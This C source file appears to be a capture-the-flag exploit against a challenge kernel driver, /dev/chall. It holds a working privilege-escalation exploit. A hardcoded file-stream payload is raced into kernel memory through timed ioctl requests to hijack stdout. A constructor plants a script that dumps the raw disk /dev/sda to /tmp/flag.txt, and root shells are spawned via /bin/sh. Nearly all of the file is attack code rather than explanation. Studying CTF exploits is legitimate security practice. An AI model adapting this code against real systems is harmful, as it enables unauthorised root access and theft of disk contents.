// Author: prosti (@.prosti. on Discord)

#include "helpers.h"
#include <string.h>

#define IOCTL_CHALL_MAGIC               'E'
#define IOCTL_CHALL_ADD_REQUEST         _IOW(IOCTL_CHALL_MAGIC, 0, struct urequest *)
#define IOCTL_CHALL_SET_WORK            _IOW(IOCTL_CHALL_MAGIC, 3, struct urequest *)

#define DEV "/dev/chall"

#define CHALL_KBUF_SIZE                 0x0400
#define CHALL_KBUFS_SIZE                0x0050
#define CHALL_KREQUESTS_MAX_SIZE        0x0020

#define STDOUT_ADDRESS                  0x657440


/* Driver structs & enums */
enum krequest_type {
    /* Handled with IOCTL_CHALL_ADD_REQUEST */
    TYPE_READ,      
    TYPE_WRITE,
    TYPE_DELETE,
    /* Handled with IOCTL_CHALL_SET_WORK */
    TYPE_SET_WORK       
};

enum krequest_status {
    REQ_PENDING,
    REQ_FREE
};

union request_info {
    struct {
        size_t size;
        char* ubuf;
        size_t kbuf_idx;
    } rw;
        
    struct {
        size_t kbuf_idx;
    } delete;

    struct {
        size_t kreq_idx;
        unsigned long time;
    } work;
};


struct urequest {
    enum krequest_type type;
    union request_info info;
    size_t req_idx;
};


__attribute__((constructor))
void init(){
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    system("rm -f /tmp/e");
    system("echo -ne '#!/bin/sh\ncat /dev/sda > /tmp/flag.txt\n' > /tmp/e");
    system("chmod +x /tmp/e");

    if(getuid() == 0)
        system("/bin/sh");
}


int main(){
    int dev;
    unsigned long fsop_payload[] = {*(unsigned long *)"/tmp/e\0", 6648880ul, 6648880ul, 6648880ul, 6648880ul, 6648880ul, 6648880ul, 6648880ul, 6648880ul, 0ul, 0ul, 0ul, 0ul, 6649376ul, 1ul, 18446744073709551615ul, 0ul, 6681808ul, 18446744073709551615ul, 0ul, 6649120ul, 0ul, 0ul, 0ul, 4294967295ul, 0ul, 0ul, 6649120ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul, 4347264ul};
    fsop_payload[5] += 1; // look at _IO_flush_all to understand why we need this lmao

    char* tmp_buf = (char *)STDOUT_ADDRESS;


    dev = open(DEV, O_RDWR);
    if(dev < 0)
        err(1, "could not open device");

    //
    // exploit goes here
    //
    // prepare write request
    struct urequest rureq = {
        .type = TYPE_WRITE,
        .info = {
            .rw = {
                .kbuf_idx = 0,
                .size = sizeof(fsop_payload) * sizeof(unsigned long),
                .ubuf = (void *)fsop_payload
            }
        }
    };

    if(ioctl(dev, IOCTL_CHALL_ADD_REQUEST, &rureq) != 0)
        err(1, "ioctl failed");

    // start countdown
    rureq.type = TYPE_SET_WORK;
    rureq.info.work.kreq_idx = rureq.req_idx;
    rureq.info.work.time = 1000; // ns
    
    if(ioctl(dev, IOCTL_CHALL_SET_WORK, &rureq) != 0)
        err(1, "ioctl failed");

    sleep(1);

    for(int i = 0; i < 0x20-1; ++i){
        // prepare read request
        struct urequest wureq = {
            .type = TYPE_READ,
            .info = {
                .rw = {
                    .kbuf_idx = 0,
                    .size = PAGE_SIZE,
                    .ubuf = tmp_buf
                }
            }
        };

        if(ioctl(dev, IOCTL_CHALL_ADD_REQUEST, &wureq) != 0)
            err(1, "ioctl failed");

        // start countdown
        wureq.type = TYPE_SET_WORK;
        wureq.info.work.kreq_idx = wureq.req_idx;
        wureq.info.work.time = 1000+i*10; // ns
        
        if(ioctl(dev, IOCTL_CHALL_SET_WORK, &wureq) != 0)
            err(1, "ioctl failed");
    }

    puts(INF "starting modprobe trigger");
    
    if(fork() != 0){
        puts("spawning shell");
        sleep(5);
        system("/bin/sh");
    }
    else{
        puts("porco dio");
        for(;;) socket(22, SOCK_DGRAM, 0);
    }
    close(dev);
    return 0;
}